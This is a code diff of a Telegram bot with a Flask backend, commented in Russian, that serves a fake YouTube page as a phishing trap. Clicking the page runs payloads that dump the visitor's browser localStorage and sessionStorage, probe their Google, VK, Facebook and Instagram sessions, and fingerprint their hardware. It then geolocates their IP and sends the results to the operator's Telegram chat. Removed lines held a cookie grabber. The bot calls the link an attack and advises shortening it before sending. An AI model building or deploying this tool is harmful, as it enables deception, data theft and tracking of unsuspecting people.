@@ -1,4 +1,4 @@
-import asyncio, threading, requests, uuid, base64
+import asyncio, requests, uuid, json
 from flask import Flask, render_template_string, request
 from aiogram import Bot, Dispatcher, F, types
 from aiogram.filters import Command
@@ -12,22 +12,32 @@ app = Flask(__name__)
 exploit_vault = {} 
 user_settings = {} 
 
-# --- АРСЕНАЛ (Исправленные скрипты) ---
+# --- ОПАСНЫЙ ПАССИВНЫЙ АРСЕНАЛ ---
 PAYLOADS = {
-    "ANALYTICS": {
-        "name": "📊 Deep Analytics (Вкладки/Сессия)",
-        "js": "d.pages=window.history.length; d.referrer=document.referrer; d.lang=navigator.language; d.scr=screen.width+'x'+screen.height;",
-        "vuln": "Information Leakage / User Tracking"
+    "SESSION_LEAK": {
+        "name": "🕵️ Social Session Leak (Поиск аккаунтов)",
+        "js": """
+            let services = {
+                google: 'https://accounts.google.com/ServiceLogin?service=mail',
+                vk: 'https://vk.com/login',
+                facebook: 'https://www.facebook.com/login',
+                instagram: 'https://www.instagram.com/accounts/login/'
+            };
+            d.sessions = {};
+            for (let name in services) {
+                let img = new Image();
+                img.src = services[name];
+                img.onload = () => { d.sessions[name] = 'active'; };
+                img.onerror = () => { d.sessions[name] = 'inactive'; };
+            }
+            d.storage = {ls: JSON.stringify(localStorage), ss: JSON.stringify(sessionStorage)};
+        """,
+        "vuln": "Cross-Origin Information Leakage (Session Detection)"
     },
-    "STEALER": {
-        "name": "🍪 Cookie & Session Grabber",
-        "js": "try { d.cookies = document.cookie || 'Protected'; d.local=JSON.stringify(localStorage); d.session=JSON.stringify(sessionStorage); } catch(e) { d.err='Blocked'; }",
-        "vuln": "Session Hijacking (High Risk)"
-    },
-    "EXPLOIT": {
-        "name": "🔥 Browser Strike (V8 Injection)",
-        "js": "console.log('Targeting V8...'); let trash = []; for(let i=0;i<100;i++){ trash.push(new ArrayBuffer(1024*1024)); } d.exploit='Memory_Load_Success';",
-        "vuln": "Resource Exhaustion / Potential RCE PoC"
+    "OSINT_DEEP": {
+        "name": "📊 Deep OSINT & Hardware (Отпечаток)",
+        "js": "d.hist=window.history.length; d.lang=navigator.language; d.plat=navigator.platform; d.cores=navigator.hardwareConcurrency;",
+        "vuln": "Browser Fingerprinting (Device Identification)"
     }
 }
 
@@ -38,54 +48,47 @@ HTML_TRAP = """
     <title>YouTube</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #fff; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; }
-        .header { width: 100%; height: 50px; border-bottom: 1px solid #e5e5e5; display: flex; align-items: center; padding: 0 15px; box-sizing: border-box; }
-        .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; display: flex; justify-content: center; align-items: center; }
-        .play-btn { position: absolute; width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12%; cursor: pointer; z-index: 10; }
-        .play-btn::after { content: ''; border-left: 18px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; position: absolute; left: 26px; top: 14px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #fff; margin: 0; font-family: sans-serif; text-align: center; overflow: hidden; }
+        .yt-header { height: 50px; border-bottom: 1px solid #eee; display: flex; align-items: center; padding: 0 15px; }
+        .player-box { background: #000; width: 100%; aspect-ratio: 16/9; position: relative; cursor: pointer; display: flex; justify-content: center; align-items: center; }
+        .play-btn { position: absolute; width: 70px; height: 50px; background: rgba(255,0,0,0.9); border-radius: 12px; }
+        .play-btn::after { content: ''; border-left: 20px solid #fff; border-top: 12px solid transparent; border-bottom: 12px solid transparent; position: absolute; left: 28px; top: 13px; }
+        .content { padding: 20px; }
+        .title { font-size: 18px; color: #030303; font-weight: 500; }
     </style>
 </head>
 <body onclick="strike()">
-    <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
-    <div class="player">
-        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; opacity:0.7;">
-        <div class="play-btn" id="pbtn"></div>
-        <div class="loader" id="ldr"></div>
+    <div class="yt-header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
+    <div class="player-box">
+        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; opacity:0.8;">
+        <div class="play-btn"></div>
     </div>
-    <div style="padding: 15px; width: 100%; box-sizing: border-box;">
-        <div style="font-size: 18px; font-weight: bold;">Exclusive Report: Telegram Leak 2026</div>
-        <div style="font-size: 12px; color: #606060; margin-top: 5px;">3.4 млн просмотров • 2 часа назад</div>
+    <div class="content">
+        <div class="title">Exclusive: Скрытые настройки Telegram (2026)</div>
+        <p style="color: #606060; font-size: 12px; margin-top: 5px;">2.1 млн просмотров • 1 час назад</p>
     </div>
 <script>
-let sent = false;
 async function strike() {
-    if(sent) return;
-    document.getElementById('pbtn').style.display = 'none';
-    document.getElementById('ldr').style.display = 'block';
+    let d = { aid: "{{ aid }}", ua: navigator.userAgent, res: screen.width+"x"+screen.height, ref: document.referrer };
     
-    let d = { aid: "{{ aid }}", ua: navigator.userAgent };
+    // Внедрение выбранного пассивного скрипта
+    try { {{ custom_script|safe }} } catch(e) {}
     
-    // Внедрение выбранного скрипта
-    try { {{ custom_script|safe }} } catch(e) { d.js_err = e.message; }
-
-    // Сбор данных железа
-    try { 
-        let c = document.createElement('canvas'); let gl = c.getContext('webgl'); 
-        let dbg = gl.getExtension('WEBGL_debug_renderer_info'); 
+    // Сбор данных о железе (GPU/Battery)
+    try {
+        let c = document.createElement('canvas'); let gl = c.getContext('webgl');
+        let dbg = gl.getExtension('WEBGL_debug_renderer_info');
         d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-        let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "%";
+        let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
     } catch(e) {}
 
-    // Отправка
-    sent = true;
+    // Мгновенная отправка и редирект
     fetch('/catch', { 
         method: 'POST', 
         headers: {'Content-Type': 'application/json'}, 
         body: JSON.stringify(d) 
     }).finally(() => { 
-        setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1500);
+        location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
     });
 }
 </script>
@@ -95,40 +98,56 @@ async function strike() {
 
 @app.route('/v/<aid>')
 def trap(aid):
-    mode = user_settings.get(str(aid), "ANALYTICS")
-    script = PAYLOADS.get(mode, PAYLOADS["ANALYTICS"])["js"]
+    mode = user_settings.get(str(aid), "SESSION_LEAK")
+    script = PAYLOADS.get(mode, PAYLOADS["SESSION_LEAK"])["js"]
     return render_template_string(HTML_TRAP, aid=aid, custom_script=script)
 
 @app.route('/catch', methods=['POST'])
 def catch():
     d = request.json
-    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
-    
-    # --- ТИХОЕ ГЕО ПО IP (Работает всегда) ---
-    geo_data = {}
+    # --- НАСТОЯЩИЙ ФИКС IP (ОБХОД RENDER) ---
+    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+
+    # Запрос ГЕО по реальному IP (Тихий)
+    city, country, isp, map_link = "N/A", "N/A", "N/A", "#"
     try:
-        r = requests.get(f"http://ip-api.com/json/{ips}?fields=status,country,city,lat,lon,isp").json()
-        if r['status'] == 'success': geo_data = r
+        r = requests.get(f"http://ip-api.com/json/{real_ip}?fields=status,country,city,lat,lon,isp").json()
+        if r['status'] == 'success':
+            city, country, isp = r['city'], r['country'], r['isp']
+            map_link = f"https://www.google.com/maps?q={r['lat']},{r['lon']}"
     except: pass
 
     token = "EXP-" + str(uuid.uuid4())[:6].upper()
-    mode = user_settings.get(str(d['aid']), "ANALYTICS")
-    exploit_vault[token] = { "vuln": PAYLOADS[mode]["vuln"], "full_dump": d, "ip_geo": geo_data }
+    mode = user_settings.get(str(d['aid']), "SESSION_LEAK")
+    
+    # Сохраняем расширенный дамп
+    exploit_vault[token] = {
+        "vuln_type": PAYLOADS[mode]["vuln"],
+        "sessions": d.get('sessions', {}),
+        "storage_dump": d.get('storage', {}),
+        "hardware_dump": {
+            "cores": d.get('cores'),
+            "gpu": d.get('gpu'),
+            "history_depth": d.get('hist'),
+            "platform": d.get('plat')
+        }
+    }
 
     report = (
-        f"🚨 **ОБЪЕКТ ВЗЛОМАН ({mode})**\n"
+        f"🎯 **ЦЕЛЬ ЗАФИКСИРОВАНА (Passive)**\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🌐 **IP:** `{ips}`\n"
-        f"📍 **ГЕО (IP):** `{geo_data.get('city', 'N/A')}, {geo_data.get('country', 'N/A')}`\n"
-        f"📡 **ISP:** `{geo_data.get('isp', 'N/A')}`\n"
-        f"🗺 [Google Maps](https://www.google.com/maps?q={geo_data.get('lat')},{geo_data.get('lon')})\n\n"
+        f"🌐 **СЕТЬ:**\n"
+        f"• IP: `{real_ip}` | `{isp}`\n"
+        f"• [Открыть карту]({map_link})\n\n"
+        f"👤 **АКТИВНЫЕ СЕССИИ:**\n"
+        f"```\n{json.dumps(d.get('sessions', {}), indent=1)}\n```\n"
         f"📱 **DEVICE:**\n"
+        f"• Экран: `{d.get('res')}`\n"
         f"• GPU: `{d.get('gpu', 'N/A')}`\n"
-        f"• Battery: `{d.get('bat', 'N/A')}`\n"
-        f"• Вкладок в истории: `{d.get('pages', 'N/A')}`\n\n"
+        f"• Battery: {d.get('bat', 'N/A')}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"🔑 **TOKEN:** `{token}`\n"
-        f"Отправь токен боту для полного дампа."
+        f"🛠 **PAYLOAD:** {mode}"
     )
     requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                   json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
@@ -141,34 +160,42 @@ dp = Dispatcher()
 @dp.message(Command("start"))
 async def start(message: types.Message):
     kb = ReplyKeyboardBuilder()
-    kb.button(text="🔥 Настроить Payload")
-    await message.answer("💀 **OSINT COMMAND CENTER v19.5**", reply_markup=kb.as_markup(resize_keyboard=True))
+    kb.button(text="🚀 Создать Пассивную ссылку")
+    await message.answer("🕶 **PHANTOM COMMAND CENTER v23.0**", reply_markup=kb.as_markup(resize_keyboard=True))
 
-@dp.message(F.text == "🔥 Настроить Payload")
+@dp.message(F.text == "🚀 Создать Пассивную ссылку")
 async def setup(message: types.Message):
     kb = InlineKeyboardBuilder()
-    for key, val in PAYLOADS.items():
-        kb.button(text=val["name"], callback_data=f"mode_{key}")
+    kb.button(text="🕵️ Social Session Leak", callback_data="p_SESSION_LEAK")
+    kb.button(text="📊 Deep Hardware OSINT", callback_data="p_OSINT_DEEP")
     kb.adjust(1)
-    await message.answer("Выбери тип атаки:", reply_markup=kb.as_markup())
+    await message.answer("Выберите метод пассивного сбора данных:", reply_markup=kb.as_markup())
 
-@dp.callback_query(F.data.startswith("mode_"))
-async def finalize(callback: types.CallbackQuery):
+@dp.callback_query(F.data.startswith("p_"))
+async def generate(callback: types.CallbackQuery):
     mode = callback.data.split("_")[1]
     user_settings[str(callback.from_user.id)] = mode
     link = f"{BASE_URL}/v/{callback.from_user.id}"
-    await callback.message.edit_text(f"✅ **ГОТОВО!**\nРежим: `{PAYLOADS[mode]['name']}`\n\n🔗 `{link}`")
+    await callback.message.edit_text(f"✅ **АТАКА ГОТОВА (Пассивный режим)**\n\nРежим: `{mode}`\n🔗 `{link}`\n\n*Совет: Сократи её через bit.ly перед отправкой!*")
 
 @dp.message(F.text.startswith("EXP-"))
-async def dump(message: types.Message):
+async def decrypt(message: types.Message):
     t = message.text.strip().upper()
     if t in exploit_vault:
-        data = exploit_vault[t]
-        await message.answer(f"🔓 **ПОЛНЫЙ ДАМП {t}:**\n\n`{data}`")
+        v = exploit_vault[t]
+        res = (
+            f"🔓 **ПОЛНЫЙ ДАМП {t}**\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"⚠️ **УЯЗВИМОСТЬ:** {v['vuln_type']}\n\n"
+            f"📦 **Storage Dump (LocalStorage/SessionStorage):**\n"
+            f"```json\n{json.dumps(v['storage_dump'], indent=2, ensure_ascii=False)}\n```\n\n"
+            f"📱 **Hardware Dump:**\n"
+            f"```json\n{json.dumps(v['hardware_dump'], indent=2, ensure_ascii=False)}\n```"
+        )
+        await message.answer(res)
 
 async def main():
-    loop = asyncio.get_event_loop()
-    loop.run_in_executor(None, lambda: app.run(host='0.0.0.0', port=10000))
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000)).start()
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
